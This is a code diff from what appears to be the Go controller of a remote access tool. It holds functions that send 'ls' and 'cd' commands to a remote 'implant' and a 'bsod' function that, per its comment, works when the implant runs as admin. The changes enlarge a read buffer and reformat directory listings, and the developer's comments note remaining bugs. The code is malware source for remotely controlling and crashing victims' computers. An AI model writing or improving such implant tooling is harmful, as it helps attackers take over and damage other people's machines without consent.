@@ -127,7 +127,7 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 
 func ls(conn *net.Conn) {
 	(*conn).Write([]byte("ls\n"))
-	request := make([]byte, 99999)
+	request := make([]byte, 99999999) //This looks reasonable. 99MB maybe a bit too much but this should be more than fine for ridiculously large dirs
 	read_len, err := (*conn).Read(request)
 	if read_len == 0 {
 		(*conn).Close()
@@ -140,10 +140,11 @@ func ls(conn *net.Conn) {
 		return
 	}
 	reply := string(request[:read_len])
-	fmt.Println(reply)
+	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
+		"	--------		" + "-----		" + "	-----" + "\n" + reply + "\n")
 }
 
-func cd(conn *net.Conn, dir2go string) { //Test this since I think cd .. is not working
+func cd(conn *net.Conn, dir2go string) { //It works but crashes when a / is sent eg: cd /
 	(*conn).Write([]byte("cd\n"))
 	buffer := make([]byte, 100)
 	read_len, err := (*conn).Read(buffer)
